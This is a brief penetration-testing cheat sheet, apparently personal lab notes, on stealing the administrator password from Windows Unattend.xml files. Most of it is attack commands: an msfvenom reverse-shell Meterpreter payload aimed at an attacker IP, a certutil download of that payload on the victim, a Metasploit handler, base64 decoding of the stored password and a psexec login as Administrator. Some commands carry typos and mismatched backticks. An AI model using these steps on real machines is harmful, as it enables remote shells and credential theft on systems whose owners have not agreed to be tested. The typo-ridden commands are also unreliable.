# Searching for passwords in Windows Configuration Files

Unattended Windows setup utility will allow you to work on multiple machines at once.

C:\Windows\Panther\Unattend.xml  
C:\Windows\Panther\Autounattend

1. Generate payload using msfvenom - ```msfvenom -p windows/x64/mterpreter/reverse_tcp LHOST=10.10.80.3 LPORt=1234 -f exe > payload.exe```
2. Setup webserver - ``python -m SimpleHTTPServer 80```
3. use certutil utility to download the payload (on victim)  - ```certutil -urlcache -f http://10.10.80.3/payload.exe payload.exe```
4. Setup Handler in Metasploit - exploit/multi/handler
5. Set options
- Set Payload
- Set LHOST
- Set LPORT

**Searching**
1. ```search -f Unattend.xml```
2. Once you cat out the file, copy and decode the password from base64
3. With the password, use psexec ```psexec.py Administrator@(targetIP)```
4. Provide decoded password
